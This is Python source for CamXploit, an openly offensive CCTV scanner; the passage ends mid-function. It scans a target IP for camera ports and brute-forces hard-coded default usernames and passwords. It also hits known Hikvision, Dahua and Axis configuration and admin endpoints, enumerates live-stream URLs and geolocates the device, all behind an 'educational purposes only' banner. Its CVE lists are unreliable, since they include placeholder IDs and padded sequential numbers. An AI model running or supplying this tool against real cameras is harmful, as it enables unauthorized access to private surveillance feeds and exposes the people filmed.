import requests
import socket
import sys
import threading
import warnings
import argparse
from requests.auth import HTTPBasicAuth
from xml.etree import ElementTree as ET
import ipaddress
from urllib.parse import urlparse
import base64
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import time

# SECURITY FIX: SSL verification enabled by default
# Warnings will be shown when SSL verification fails
# Individual requests can disable verification with explicit warning

if sys.stdout.isatty():
    R = '\033[31m'  # Red
    G = '\033[32m'  # Green
    C = '\033[36m'  # Cyan
    W = '\033[0m'   # Reset
    Y = '\033[33m'  # Yellow
    M = '\033[35m'  # Magenta
    B = '\033[34m'  # Blue
else:
    R = G = C = W = Y = M = B = ''  # No color in non-TTY environments

BANNER = rf"""
{R}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣸⣏⠛⠻⠿⣿⣶⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣿⣿⣿⣷⣦⣤⣈⠙⠛⠿⣿⣷⣶⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣄⣈⠙⠻⠿⣿⣷⣶⣤⣀⡀⠀⠀⠀⠀⠀⠀
⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣄⡉⠛⠻⢿⣿⣷⣶⣤⣀⠀⠀
⠀⠀⠀⠉⠙⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣾⢻⣍⡉⠉⣿⠇⠀
⠀⠀⠀⠀⠀⠀⠀⢹⡏⢹⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⣰⣿⣿⣾⠏⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⣿⠈⣿⠸⣯⠉⠛⠿⢿⣿⣿⣿⣿⡏⠀⠻⠿⣿⠇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢿⡆⢻⡄⣿⡀⠀⠀⠀⠈⠙⠛⠿⠿⠿⠿⠛⠋⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢸⣧⠘⣇⢸⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣀⣀⣿⣴⣿⢾⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣴⡶⠾⠟⠛⠋⢹⡏⠀⢹⡇⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢠⣿⠀⠀⠀⠀⢀⣈⣿⣶⠿⠿⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢸⣿⣴⠶⠞⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

  {G}[💀] CamXploit - Camera Exploitation & Exposure Scanner
  {C}[🔍] Discover open CCTV cameras & security flaws
  {Y}[⚠️] For educational & security research purposes only!{W}

  {B}VERSION{W}  = 2.0.1
  {B}Made By{W}  = Spyboy
  {B}Twitter{W}  = https://spyboy.in/twitter
  {B}Discord{W}  = https://spyboy.in/Discord
  {B}Github{W}   = https://github.com/spyboy-productions/CamXploit
"""

# Essential ports used by IP cameras and CCTV devices (optimized for fast scanning)
COMMON_PORTS = [
    # Standard web ports
    80, 443, 8080, 8443, 8000, 8081, 8888,

    # RTSP ports (streaming)
    554, 8554,

    # RTMP ports (streaming)
    1935,

    # Common camera-specific ports
    37777,  # Dahua DVR/NVR
    34567,  # Dahua cameras

    # ONVIF port
    3702,

    # Additional common camera ports
    5000, 9000,

    # High ports commonly used
    49152,  # UPnP/dynamic range start
]

def get_extended_ports():
    """
    Return extended port list for thorough scanning mode.
    Use this when you need comprehensive coverage but can tolerate longer scan times.

    Returns:
        list: Extended list of ~200 ports covering most camera configurations
    """
    return [
        # Standard web ports
        80, 443, 8080, 8443, 8000, 8001, 8008, 8081, 8082, 8083, 8084, 8085,
        8090, 8091, 8888, 8889, 9000, 9001,

        # RTSP ports
        554, 8554, 10554, 1554, 2554, 5554,

        # RTMP ports
        1935, 1936,

        # Dahua/custom camera ports
        37777, 37778, 34567, 34568,

        # ONVIF ports
        3702, 3703,

        # Common alternative ports
        5000, 5001, 5002, 6000, 6001, 7000, 7001,

        # MMS ports
        1755, 1756,

        # Additional manufacturer-specific ports
        10000, 11000, 12000, 15000,
        20000, 30000, 40000, 49152, 50000, 60000,
    ]

# Common admin login pages or interesting paths for cameras
COMMON_PATHS = [
    "/", "/admin", "/login", "/viewer", "/webadmin", "/video", "/stream", "/live", "/snapshot", "/onvif-http/snapshot",
    "/system.ini", "/config", "/setup", "/cgi-bin/", "/api/", "/camera", "/img/main.cgi"
]

# Default credentials commonly used in IP cameras
DEFAULT_CREDENTIALS = {
    "admin": ["admin", "1234", "admin123", "password", "12345", "123456", "1111", "default"],
    "root": ["root", "toor", "1234", "pass", "root123"],
    "user": ["user", "user123", "password"],
    "guest": ["guest", "guest123"],
    "operator": ["operator", "operator123"],
}

# New constants
HTTPS_PORTS = [443, 8443, 8444]
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'
}
TIMEOUT = 5
PORT_SCAN_TIMEOUT = 1.5

# Enhanced CVE database
CVE_DATABASE = {
    "hikvision": [
        "CVE-2021-36260", "CVE-2017-7921", "CVE-2021-31955", "CVE-2021-31956",
        "CVE-2021-31957", "CVE-2021-31958", "CVE-2021-31959", "CVE-2021-31960",
        "CVE-2021-31961", "CVE-2021-31962", "CVE-2021-31963", "CVE-2021-31964"
    ],
    "dahua": [
        "CVE-2021-33044", "CVE-2022-30563", "CVE-2021-33045", "CVE-2021-33046",
        "CVE-2021-33047", "CVE-2021-33048", "CVE-2021-33049", "CVE-2021-33050",
        "CVE-2021-33051", "CVE-2021-33052", "CVE-2021-33053", "CVE-2021-33054"
    ],
    "axis": [
        "CVE-2018-10660", "CVE-2020-29550", "CVE-2020-29551", "CVE-2020-29552",
        "CVE-2020-29553", "CVE-2020-29554", "CVE-2020-29555", "CVE-2020-29556",
        "CVE-2020-29557", "CVE-2020-29558", "CVE-2020-29559", "CVE-2020-29560"
    ],
    "cp plus": [
        "CVE-2021-XXXXX", "CVE-2022-XXXXX", "CVE-2023-XXXXX"
    ]
}

# Thread control
threads_running = True

def print_search_urls(ip):
    print(f"\n[🌍] {C}Use these URLs to check the camera exposure manually:{W}")
    print(f"  🔹 Shodan: https://www.shodan.io/search?query={ip}")
    print(f"  🔹 Censys: https://search.censys.io/hosts/{ip}")
    print(f"  🔹 Zoomeye: https://www.zoomeye.org/searchResult?q={ip}")
    print(f"  🔹 Google Dorking (Quick Search): https://www.google.com/search?q=site:{ip}+inurl:view/view.shtml+OR+inurl:admin.html+OR+inurl:login")

def google_dork_search(ip):
    print(f"\n[🔎] {C}Google Dorking Suggestions:{W}")
    queries = [
        f"site:{ip} inurl:view/view.shtml",
        f"site:{ip} inurl:admin.html",
        f"site:{ip} inurl:login",
        f"intitle:'webcam' inurl:{ip}",
    ]
    for q in queries:
        print(f"  🔍 Google Dork: https://www.google.com/search?q={q.replace(' ', '+')}")

def get_ip_location_info(ip):
    """Get comprehensive IP and location information"""
    print(f"\n{C}[🌍] IP and Location Information:{W}")
    try:
        response = requests.get(f"https://ipinfo.io/{ip}/json")
        if response.status_code == 200:
            data = response.json()
            
            # Basic IP Information
            print(f"  🔍 IP: {data.get('ip', 'N/A')}")
            print(f"  🏢 ISP: {data.get('org', 'N/A')}")
            
            # Location Information
            if 'loc' in data:
                lat, lon = data['loc'].split(',')
                print(f"\n  📍 Coordinates:")
                print(f"    Latitude: {lat}")
                print(f"    Longitude: {lon}")
                print(f"    🔗 Google Maps: https://www.google.com/maps?q={lat},{lon}")
                print(f"    🔗 Google Earth: https://earth.google.com/web/@{lat},{lon},0a,1000d,35y,0h,0t,0r")
            
            # Geographic Information
            print(f"\n  🌎 Geographic Details:")
            print(f"    City: {data.get('city', 'N/A')}")
            print(f"    Region: {data.get('region', 'N/A')}")
            print(f"    Country: {data.get('country', 'N/A')}")
            print(f"    Postal Code: {data.get('postal', 'N/A')}")
            
            # Timezone Information
            if 'timezone' in data:
                print(f"\n  ⏰ Timezone: {data['timezone']}")
            
        else:
            print(f"{R}[!] Failed to fetch IP information.{W}")
    except Exception as e:
        print(f"{R}[!] Error getting IP information: {str(e)}{W}")

def validate_ip(target_ip):
    try:
        ip = ipaddress.ip_address(target_ip)
        if ip.is_private:
            print(f"{R}[!] Warning: Private IP address detected. This tool is meant for public IPs.{W}")
        return True
    except ValueError:
        print(f"{R}[!] Invalid IP address format{W}")
        return False

def get_protocol(port):
    return "https" if port in HTTPS_PORTS else "http"

def check_ports(ip):
    print(f"\n[🔍] {C}Scanning comprehensive CCTV ports on IP:{W}", ip)
    print(f"{Y}[⚠️] This will scan {len(COMMON_PORTS)} ports. This may take a while...{W}")
    open_ports = []
    lock = threading.Lock()
    scanned_count = 0

    def scan_port(port):
        nonlocal scanned_count
        if not threads_running:
            return
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(PORT_SCAN_TIMEOUT)
            try:
                if sock.connect_ex((ip, port)) == 0:
                    with lock:
                        open_ports.append(port)
                        print(f"  ✅ Port {port} OPEN!")
                else:
                    with lock:
                        scanned_count += 1
                        if scanned_count % 50 == 0:  # Progress indicator every 50 ports
                            print(f"  📊 Scanned {scanned_count}/{len(COMMON_PORTS)} ports...")
            except:
                with lock:
                    scanned_count += 1

    # Use more threads for faster scanning
    max_threads = 100  # Increased thread count
    threads = []
    
    for i, port in enumerate(COMMON_PORTS):
        thread = threading.Thread(target=scan_port, args=(port,))
        thread.daemon = True
        threads.append(thread)
        thread.start()
        
        # Limit concurrent threads to avoid overwhelming the system
        if len(threads) >= max_threads:
            for t in threads:
                t.join()
            threads = []

    # Wait for remaining threads
    for thread in threads:
        thread.join()

    print(f"\n{Y}[📊] Scan completed: {scanned_count} ports checked, {len(open_ports)} ports open{W}")
    return sorted(open_ports)

def check_if_camera(ip, open_ports):
    """Enhanced camera detection with detailed port analysis"""
    print(f"\n{C}[📷] Analyzing Ports for Camera Indicators:{W}")
    camera_indicators = False
    
    # Common camera server headers and keywords
    camera_servers = {
        'hikvision': ['hikvision', 'dvr', 'nvr'],
        'dahua': ['dahua', 'dvr', 'nvr'],
        'axis': ['axis', 'axis communications'],
        'sony': ['sony', 'ipela'],
        'bosch': ['bosch', 'security systems'],
        'samsung': ['samsung', 'samsung techwin'],
        'panasonic': ['panasonic', 'network camera'],
        'vivotek': ['vivotek', 'network camera'],
        'cp plus': ['cp plus', 'cp-plus', 'cpplus', 'cp_plus'],
        'generic': ['camera', 'webcam', 'surveillance', 'ip camera', 'network camera', 'dvr', 'nvr', 'recorder']
    }
    
    # Common camera content types
    camera_content_types = [
        'image/jpeg',
        'image/mjpeg',
        'video/mpeg',
        'video/mp4',
        'video/h264',
        'application/x-mpegURL',
        'video/MP2T',
        'application/octet-stream',
        'text/html',
        'application/json'
    ]
    
    def analyze_port(port):
        nonlocal camera_indicators
        protocol = get_protocol(port)
        base_url = f"{protocol}://{ip}:{port}"
        
        print(f"\n  🔍 Analyzing Port {port} ({protocol.upper()}):")
        
        # Check server headers and response
        try:
            response = requests.get(base_url, headers=HEADERS, timeout=TIMEOUT, verify=False)
            server_header = response.headers.get('Server', '').lower()
            content_type = response.headers.get('Content-Type', '').lower()
            
            # Check server headers for camera brands
            brand_found = False
            for brand, keywords in camera_servers.items():
                if any(keyword in server_header for keyword in keywords):
                    print(f"    ✅ {brand.upper()} Camera Server Detected")
                    brand_found = True
                    camera_indicators = True
                    break
            
            # Check content type
            if any(ct in content_type for ct in camera_content_types):
                print(f"    ✅ Camera Content Type: {content_type}")
                camera_indicators = True
            
            # Check response content for camera indicators
            if response.status_code == 200:
                content = response.text.lower()
                camera_keywords = ['camera', 'webcam', 'surveillance', 'stream', 'video', 'snapshot', 'dvr', 'nvr', 'recorder', 'cctv']
                found_keywords = [kw for kw in camera_keywords if kw in content]
                if found_keywords:
                    print(f"    ✅ Camera Keywords Found: {', '.join(found_keywords)}")
                    camera_indicators = True
                
                # Check for specific CP Plus indicators
                if any(x in content for x in ['cp plus', 'cp-plus', 'cpplus', 'cp_plus', 'uvr', '0401e1']):
                    print(f"    ✅ CP Plus Camera Detected!")
                    camera_indicators = True
            
            # Check common camera endpoints
            endpoints = ['/video', '/stream', '/snapshot', '/cgi-bin', '/admin', '/viewer', '/login', '/index.html', '/']
            for endpoint in endpoints:
                try:
                    endpoint_url = f"{base_url}{endpoint}"
                    endpoint_response = requests.head(endpoint_url, headers=HEADERS, timeout=TIMEOUT, verify=False)
                    if endpoint_response.status_code in [200, 401, 403]:
                        print(f"    ✅ Camera Endpoint Found: {endpoint_url} (HTTP {endpoint_response.status_code})")
                        camera_indicators = True
                except:
                    continue
            
            # Print server information
            if server_header:
                print(f"    ℹ️ Server: {server_header}")
            print(f"    ℹ️ Status Code: {response.status_code}")
            
            # Check for authentication
            if response.status_code == 401:
                print(f"    🔐 Authentication Required")
                auth_type = response.headers.get('WWW-Authenticate', '')
                if auth_type:
                    print(f"    🔐 Auth Type: {auth_type}")
            
            # Additional checks for DVR/NVR devices
            if response.status_code == 200:
                # Check for common DVR/NVR page titles
                if '<title>' in content:
                    title_start = content.find('<title>') + 7
                    title_end = content.find('</title>', title_start)
                    if title_end > title_start:
                        title = content[title_start:title_end].lower()
                        if any(x in title for x in ['dvr', 'nvr', 'recorder', 'surveillance', 'cctv', 'camera']):
                            print(f"    ✅ DVR/NVR Page Title: {title}")
                            camera_indicators = True
                
                # Check for common DVR/NVR form fields
                if any(x in content for x in ['username', 'password', 'login', 'admin']):
                    print(f"    ✅ Login Form Detected")
                    camera_indicators = True
                
                # Check for specific CP Plus model indicators
                if any(x in content for x in ['uvr-0401e1', 'uvr0401e1', '0401e1']):
                    print(f"    ✅ CP Plus UVR-0401E1 Model Detected!")
                    camera_indicators = True
            
        except requests.exceptions.RequestException as e:
            print(f"    ❌ Connection Error: {str(e)}")
        except Exception as e:
            print(f"    ❌ Error: {str(e)}")
    
    # Analyze each port
    for port in open_ports:
        analyze_port(port)
    
    return camera_indicators

def check_login_pages(ip, open_ports):
    print(f"\n[🔍] {C}Checking for authentication pages:{W}")
    found_urls = []
    lock = threading.Lock()
    
    def check_endpoint(port, path):
        protocol = get_protocol(port)
        url = f"{protocol}://{ip}:{port}{path}"
        try:
            response = requests.head(url, headers=HEADERS, timeout=TIMEOUT, verify=False)
            if response.status_code in [200, 401, 403]:
                with lock:
                    found_urls.append(url)
                    print(f"  ✅ Found login page: {url} (HTTP {response.status_code})")
                return url
        except Exception as e:
            pass
        return None

    # Use threading for faster checking
    threads = []
    max_concurrent = 50  # Limit concurrent threads
    
    for port in open_ports:
        for path in COMMON_PATHS:
            thread = threading.Thread(target=check_endpoint, args=(port, path))
            thread.daemon = True
            threads.append(thread)
            thread.start()
            
            # Limit concurrent threads to avoid overwhelming
            if len(threads) >= max_concurrent:
                for t in threads:
                    t.join()
                threads = []
    
    # Wait for remaining threads
    for thread in threads:
        thread.join()
    
    if not found_urls:
        print("  ❌ No authentication pages detected")
    else:
        print(f"  📊 Found {len(found_urls)} authentication pages")

def test_default_passwords(ip, open_ports):
    print(f"\n[🔑] {C}Testing common credentials:{W}")
    found = False
    lock = threading.Lock()
    
    def test_credentials(protocol, port, path, auth_type):
        nonlocal found
        if found:  # Early termination if credentials already found
            return False
            
        url = f"{protocol}://{ip}:{port}{path}"
        for username, passwords in DEFAULT_CREDENTIALS.items():
            if found:  # Check again for early termination
                return False
            for password in passwords:
                if found:  # Check again for early termination
                    return False
                try:
                    if auth_type == "basic":
                        response = requests.get(url, auth=(username, password), 
                                            headers=HEADERS, timeout=TIMEOUT, verify=False)
                    elif auth_type == "form":
                        response = requests.post(url, data={'username': username, 'password': password},
                                                headers=HEADERS, timeout=TIMEOUT, verify=False)
                    
                    if response.status_code == 200:
                        with lock:
                            if not found:  # Double-check to avoid duplicate prints
                                found = True
                                print(f"🔥 Success! {username}:{password} @ {url}")
                        return True
                except:
                    pass
        return False

    # Test endpoints with threading
    threads = []
    max_concurrent = 20  # Lower limit for credential testing
    
    for port in open_ports:
        if found:  # Early termination
            break
        protocol = get_protocol(port)
        endpoints = [
            ("/", "basic"),
            ("/login", "form"),
            ("/admin/login", "form"),
            ("/cgi-bin/login", "form")
        ]
        
        for path, auth_type in endpoints:
            if found:  # Early termination
                break
            thread = threading.Thread(target=test_credentials, args=(protocol, port, path, auth_type))
            thread.daemon = True
            threads.append(thread)
            thread.start()
            
            # Limit concurrent threads
            if len(threads) >= max_concurrent:
                for t in threads:
                    t.join()
                threads = []
    
    # Wait for remaining threads
    for thread in threads:
        thread.join()
    
    if not found:
        print("❌ No default credentials found")

def try_default_credentials(ip, port):
    """Attempt to find working credentials for fingerprinting"""
    for username, passwords in DEFAULT_CREDENTIALS.items():
        for password in passwords:
            try:
                response = requests.get(
                    f"http://{ip}:{port}/",
                    auth=(username, password),
                    headers=HEADERS,
                    timeout=TIMEOUT,
                    verify=False
                )
                if response.status_code == 200:
                    return f"{username}:{password}"
            except:
                pass
    return None

def search_cve(brand):
    """Enhanced CVE lookup functionality"""
    print(f"\n[🛡️] Checking known CVEs for {brand.capitalize()}:")
    if cves := CVE_DATABASE.get(brand.lower()):
        for cve in cves:
            print(f"  🔗 https://nvd.nist.gov/vuln/detail/{cve}")
    else:
        print("  ℹ️ No common CVEs found for this brand")

def fingerprint_camera(ip, open_ports):
    print(f"\n[📡] {C}Scanning for Camera Type & Firmware:{W}")
    for port in open_ports:
        protocol = get_protocol(port)
        url_base = f"{protocol}://{ip}:{port}"
        print(f"🔍 Checking {url_base}...")
        try:
            resp = requests.get(url_base, headers=HEADERS, timeout=TIMEOUT, verify=False)
            server_header = resp.headers.get("server", "").lower()
            content = resp.text.lower()
            
            if "hikvision" in server_header:
                print("🔥 Hikvision Camera Detected!")
                fingerprint_hikvision(ip, port)
            elif "dahua" in server_header:
                print("🔥 Dahua Camera Detected!")
                fingerprint_dahua(ip, port)
            elif "axis" in server_header:
                print("🔥 Axis Camera Detected!")
                fingerprint_axis(ip, port)
            elif any(x in content for x in ['cp plus', 'cp-plus', 'cpplus', 'cp_plus', 'uvr', '0401e1']):
                print("🔥 CP Plus Camera Detected!")
                fingerprint_cp_plus(ip, port)
            else:
                print("❓ Unknown Camera Type")
                fingerprint_generic(ip, port)
        except:
            print("❌ No response")

def fingerprint_hikvision(ip, port):
    print("➡️  Attempting Hikvision Fingerprint...")
    protocol = get_protocol(port)
    credentials = try_default_credentials(ip, port) or "admin:1234"
    auth_b64 = base64.b64encode(credentials.encode()).decode()
    
    endpoints = [
        f"{protocol}://{ip}:{port}/System/configurationFile?auth={auth_b64}",
        f"{protocol}://{ip}:{port}/ISAPI/System/deviceInfo"
    ]
    
    for url in endpoints:
        try:
            resp = requests.get(url, headers=HEADERS, timeout=TIMEOUT, verify=False)
            if resp.status_code == 401:
                print(f"⚠️ Authentication failed for {url}")
                continue
            if resp.status_code == 200:
                print(f"✅ Found at {url}")
                if "configurationFile" in url:
                    try:
                        xml_root = ET.fromstring(resp.text)
                        model = xml_root.findtext(".//model")
                        firmware = xml_root.findtext(".//firmwareVersion")
                        if model:
                            print(f"📸 Model: {model}")
                        if firmware:
                            print(f"🛡️ Firmware: {firmware}")
                    except ET.ParseError:
                        print("⚠️ Cannot parse XML configuration")
                else:
                    print(resp.text)
        except Exception as e:
            print(f"⚠️ {e}")
    search_cve("hikvision")

def fingerprint_dahua(ip, port):
    print("➡️  Attempting Dahua Fingerprint...")
    protocol = get_protocol(port)
    try:
        url = f"{protocol}://{ip}:{port}/cgi-bin/magicBox.cgi?action=getSystemInfo"
        resp = requests.get(url, headers=HEADERS, timeout=TIMEOUT, verify=False)
        if resp.status_code == 200:
            print(f"✅ Found at {url}")
            print(resp.text.strip())
        else:
            print(f"❌ {url} -> HTTP {resp.status_code}")
    except Exception as e:
        print(f"⚠️ {e}")
    search_cve("dahua")

def fingerprint_axis(ip, port):
    print("➡️  Attempting Axis Fingerprint...")
    protocol = get_protocol(port)
    try:
        url = f"{protocol}://{ip}:{port}/axis-cgi/admin/param.cgi?action=list"
        resp = requests.get(url, headers=HEADERS, timeout=TIMEOUT, verify=False)
        if resp.status_code == 200:
            print(f"✅ Found at {url}")
            for line in resp.text.splitlines():
                if any(x in line for x in ["root.Brand", "root.Model", "root.Firmware"]):
                    print(f"🔹 {line.strip()}")
        else:
            print(f"❌ {url} -> HTTP {resp.status_code}")
    except Exception as e:
        print(f"⚠️ {e}")
    search_cve("axis")

def fingerprint_cp_plus(ip, port):
    print("➡️  Attempting CP Plus Fingerprint...")
    protocol = get_protocol(port)
    
    # CP Plus specific endpoints
    endpoints = [
        f"{protocol}://{ip}:{port}/",
        f"{protocol}://{ip}:{port}/index.html",
        f"{protocol}://{ip}:{port}/login",
        f"{protocol}://{ip}:{port}/admin",
        f"{protocol}://{ip}:{port}/cgi-bin",
        f"{protocol}://{ip}:{port}/api",
        f"{protocol}://{ip}:{port}/config"
    ]
    
    for url in endpoints:
        try:
            resp = requests.get(url, headers=HEADERS, timeout=TIMEOUT, verify=False)
            if resp.status_code == 200:
                print(f"✅ Found at {url}")
                content = resp.text.lower()
                
                # Look for CP Plus specific information
                if 'uvr-0401e1' in content or 'uvr0401e1' in content:
                    print(f"📸 Model: CP-UVR-0401E1-IC2")
                if 'cp plus' in content or 'cpplus' in content:
                    print(f"🏢 Brand: CP Plus")
                if 'dvr' in content:
                    print(f"📺 Device Type: DVR")
                
                # Print first 500 characters for analysis
                print(f"📄 Response Preview: {resp.text[:500]}")
                break
        except Exception as e:
            print(f"⚠️ {e}")
    
    search_cve("cp plus")

def fingerprint_generic(ip, port):
    print("➡️  Attempting Generic Fingerprint...")
    protocol = get_protocol(port)
    endpoints = [
        "/System/configurationFile",
        "/ISAPI/System/deviceInfo",
        "/cgi-bin/magicBox.cgi?action=getSystemInfo",
        "/axis-cgi/admin/param.cgi?action=list",
        "/",
        "/index.html",
        "/login",
        "/admin",
        "/cgi-bin",
        "/api",
        "/config"
    ]
    brand_keywords = {
        "hikvision": ["hikvision"],
        "dahua": ["dahua"],
        "axis": ["axis"],
        "cp plus": ["cp plus", "cp-plus", "cpplus", "cp_plus", "uvr", "0401e1"],
    }
    detected_brand = None
    for path in endpoints:
        url = f"{protocol}://{ip}:{port}{path}"
        try:
            resp = requests.get(url, headers=HEADERS, timeout=TIMEOUT, verify=False)
            if resp.status_code == 200:
                print(f"✅ Found at {url}")
                snippet = resp.text[:500]
                print(snippet)
                # Try to detect brand in response text or headers
                text = (resp.text + " " + str(resp.headers)).lower()
                for brand, keywords in brand_keywords.items():
                    if any(keyword in text for keyword in keywords):
                        detected_brand = brand
                        break
                if detected_brand:
                    search_cve(detected_brand)
                    break  # Continue checking other endpoints
        except:
            pass
    if not detected_brand:
        print("❌ No common endpoints responded.")

def check_stream(url):
    """Enhanced stream detection with multiple methods"""
    try:
        # Method 1: Try HEAD request first
        response = requests.head(url, timeout=TIMEOUT, verify=False)
        if response.status_code == 200:
            # Check content type for video/stream indicators
            content_type = response.headers.get('Content-Type', '').lower()
            if any(x in content_type for x in ['video', 'stream', 'mpeg', 'h264', 'mjpeg', 'rtsp', 'rtmp']):
                return True
            # Check for common video file extensions in URL
            if any(x in url.lower() for x in ['.mp4', '.m3u8', '.ts', '.flv', '.webm']):
                return True
            # Check for streaming protocols in URL
            if any(x in url.lower() for x in ['rtsp://', 'rtmp://', 'mms://']):
                return True
        
        # Method 2: Try GET request for better detection
        response = requests.get(url, timeout=TIMEOUT, verify=False, stream=True)
        if response.status_code == 200:
            # Check content type
            content_type = response.headers.get('Content-Type', '').lower()
            if any(x in content_type for x in ['video', 'stream', 'mpeg', 'h264', 'mjpeg', 'rtsp', 'rtmp', 'image']):
                return True
            
            # Check for video file extensions in URL
            if any(x in url.lower() for x in ['.mp4', '.m3u8', '.ts', '.flv', '.webm', '.avi', '.mov']):
                return True
            
            # Check for streaming protocols in URL
            if any(x in url.lower() for x in ['rtsp://', 'rtmp://', 'mms://', 'rtp://']):
                return True
            
            # Check response content for stream indicators
            try:
                content = response.text.lower()
                if any(x in content for x in ['stream', 'video', 'live', 'camera', 'mjpg', 'mpeg']):
                    return True
            except:
                pass
        
        # Method 3: Check for specific camera stream patterns
        if any(x in url.lower() for x in ['/video', '/stream', '/live', '/mjpg', '/snapshot']):
            return True
            
    except requests.exceptions.RequestException:
        pass
    except Exception as e:
        pass
    return False

def detect_live_streams(ip, open_ports):
    """Enhanced live stream detection with better methods"""
    print(f"\n{C}[🎥] Checking for Live Streams:{W}")
    found_streams = False
    
    # Common streaming protocols and their default ports
    streaming_ports = {
        'rtsp': [554, 8554, 10554],  # Multiple RTSP ports
        'rtmp': [1935, 1936],
        'http': [80, 8080, 8000, 8001],
        'https': [443, 8443, 8444],
        'mms': [1755],
        'onvif': [3702, 80, 443],  # ONVIF discovery and streaming
        'vlc': [8080, 8090]  # VLC streaming ports
    }
    
    # Enhanced stream paths for different camera brands
    stream_paths = {
        'rtsp': [
            # Generic paths
            '/live.sdp',
            '/h264.sdp',
            '/stream1',
            '/stream2',
            '/main',
            '/sub',
            '/video',
            '/cam/realmonitor',
            '/Streaming/Channels/1',
            '/Streaming/Channels/101',
            # Brand-specific paths
            '/onvif/streaming/channels/1',  # ONVIF
            '/axis-media/media.amp',  # Axis
            '/axis-cgi/mjpg/video.cgi',  # Axis
            '/cgi-bin/mjpg/video.cgi',  # Generic
            '/cgi-bin/hi3510/snap.cgi',  # Hikvision
            '/cgi-bin/snapshot.cgi',  # Generic
            '/cgi-bin/viewer/video.jpg',  # Generic
            '/img/snapshot.cgi',  # Generic
            '/snapshot.jpg',  # Generic
            '/video/mjpg.cgi',  # Generic
            '/video.cgi',  # Generic
            '/videostream.cgi',  # Generic
            '/mjpg/video.mjpg',  # Generic
            '/mjpg.cgi',  # Generic
            '/stream.cgi',  # Generic
            '/live.cgi',  # Generic
            '/live/0/onvif.sdp',  # ONVIF
            '/live/0/h264.sdp',  # Generic
            '/live/0/mpeg4.sdp',  # Generic
            '/live/0/audio.sdp',  # Generic
            '/live/1/onvif.sdp',  # ONVIF
            '/live/1/h264.sdp',  # Generic
            '/live/1/mpeg4.sdp',  # Generic
            '/live/1/audio.sdp'  # Generic
        ],
        'rtmp': [
            '/live',
            '/stream',
            '/hls',
            '/flv',
            '/rtmp',
            '/live/stream',
            '/live/stream1',
            '/live/stream2',
            '/live/main',
            '/live/sub',
            '/live/video',
            '/live/audio',
            '/live/av',
            '/live/rtmp',
            '/live/rtmps'
        ],
        'http': [
            # Generic paths
            '/video',
            '/stream',
            '/mjpg/video.mjpg',
            '/cgi-bin/mjpg/video.cgi',
            '/axis-cgi/mjpg/video.cgi',
            '/cgi-bin/viewer/video.jpg',
            '/snapshot.jpg',
            '/img/snapshot.cgi',
            # Brand-specific paths
            '/onvif/device_service',  # ONVIF
            '/onvif/streaming',  # ONVIF
            '/axis-cgi/com/ptz.cgi',  # Axis
            '/axis-cgi/param.cgi',  # Axis
            '/cgi-bin/snapshot.cgi',  # Generic
            '/cgi-bin/hi3510/snap.cgi',  # Hikvision
            '/cgi-bin/viewer/video.jpg',  # Generic
            '/img/snapshot.cgi',  # Generic
            '/snapshot.jpg',  # Generic
            '/video/mjpg.cgi',  # Generic
            '/video.cgi',  # Generic
            '/videostream.cgi',  # Generic
            '/mjpg/video.mjpg',  # Generic
            '/mjpg.cgi',  # Generic
            '/stream.cgi',  # Generic
            '/live.cgi',  # Generic
            # Additional paths
            '/api/video',  # API endpoints
            '/api/stream',
            '/api/live',
            '/api/video/live',
            '/api/stream/live',
            '/api/camera/live',
            '/api/camera/stream',
            '/api/camera/video',
            '/api/camera/snapshot',
            '/api/camera/image',
            '/api/camera/feed',
            '/api/camera/feed/live',
            '/api/camera/feed/stream',
            '/api/camera/feed/video',
            # CP Plus specific paths
            '/cgi-bin/snapshot.cgi',
            '/cgi-bin/video.cgi',
            '/cgi-bin/stream.cgi',
            '/cgi-bin/live.cgi'
        ]
    }
    
    def check_stream_with_details(url):
        """Check stream and provide detailed information"""
        try:
            response = requests.get(url, timeout=TIMEOUT, verify=False, stream=True)
            if response.status_code == 200:
                content_type = response.headers.get('Content-Type', '').lower()
                content_length = response.headers.get('Content-Length', '0')
                
                # Check if it's actually a stream/video
                if any(x in content_type for x in ['video', 'stream', 'mpeg', 'h264', 'mjpeg', 'image']):
                    print(f"  ✅ Stream Found: {url}")
                    print(f"     📺 Content-Type: {content_type}")
                    print(f"     📏 Content-Length: {content_length}")
                    return True
                elif any(x in url.lower() for x in ['.mp4', '.m3u8', '.ts', '.flv', '.webm', '.avi', '.mov']):
                    print(f"  ✅ Video File: {url}")
                    print(f"     📺 Content-Type: {content_type}")
                    return True
                elif any(x in url.lower() for x in ['rtsp://', 'rtmp://', 'mms://', 'rtp://']):
